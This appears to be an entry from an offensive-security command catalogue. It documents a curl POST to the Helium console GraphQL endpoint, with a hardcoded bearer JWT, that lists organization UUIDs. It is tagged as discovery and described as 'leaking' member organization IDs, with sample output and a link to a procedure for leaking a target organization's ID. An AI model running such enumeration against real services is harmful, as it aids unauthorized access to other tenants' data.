---
id: cmd-graphql-orgs
data: >-
  curl -X POST https://console.helium.com/graphql -H "Authorization: Bearer
  eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A"
  -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT
  10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149
  Safari/537.36" -d
  '{"operationName":"PaginatedOrganizationsQuery","variables":{"page":1,"pageSize":10},"query":"query
  PaginatedOrganizationsQuery($page: Int, $pageSize: Int) {\n
  organizations(page: $page, pageSize: $pageSize) {\n entries {\n
  ...OrganizationFragment\n __typename\n }\n totalEntries\n totalPages\n
  pageSize\n pageNumber\n __typename\n }\n}\n\nfragment OrganizationFragment on
  Organization {\n id\n name\n inserted_at\n __typename\n}"}'
tags:
  - graphql
  - discovery
type: command
output: >-
  {"data":{"organizations":{"__typename":"PaginatedOrganizations","entries":[{"__typename":"Organization","id":"883b0a46-e4cf-4315-af4f-4226d1ada561","inserted_at":"2020-03-31T00:58:34","name":"lol"},{"__typename":"Organization","id":"cb23000e-65b3-4628-9ede-656ffa0d5aa8","inserted_at":"2020-03-31T01:05:42","name":"target"}],"pageNumber":null,"pageSize":null,"totalEntries":null,"totalPages":null}}}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:20.903Z'
verified: false
validated: true
submitted: true
---
# graphql-query-organizations

## Command

```bash
curl -X POST https://console.helium.com/graphql -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A" -H "Content-Type: application/json" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" -d '{"operationName":"PaginatedOrganizationsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedOrganizationsQuery($page: Int, $pageSize: Int) {\n organizations(page: $page, pageSize: $pageSize) {\n entries {\n ...OrganizationFragment\n __typename\n }\n totalEntries\n totalPages\n pageSize\n pageNumber\n __typename\n }\n}\n\nfragment OrganizationFragment on Organization {\n id\n name\n inserted_at\n __typename\n}"}'
```

## Description

Sends a GraphQL POST request to fetch paginated organizations for the authenticated user, leaking UUIDs of member organizations.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Authorization | Bearer JWT token | Yes |
| Content-Type | application/json | Yes |
| operationName | PaginatedOrganizationsQuery | Yes |
| variables | {"page":1,"pageSize":10} | Yes |
| query | GraphQL query string | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://console.helium.com/graphql -H "Authorization: Bearer $JWT" -H "Content-Type: application/json" -d '{...}'
```

### Advanced Usage

Increase pageSize for more results: variables {"page":1,"pageSize":50}

## Expected Output

JSON with organization entries including IDs, names, and inserted_at timestamps.

## Related

- [[procedures/leak-target-organization-id-via-graphql-query]]
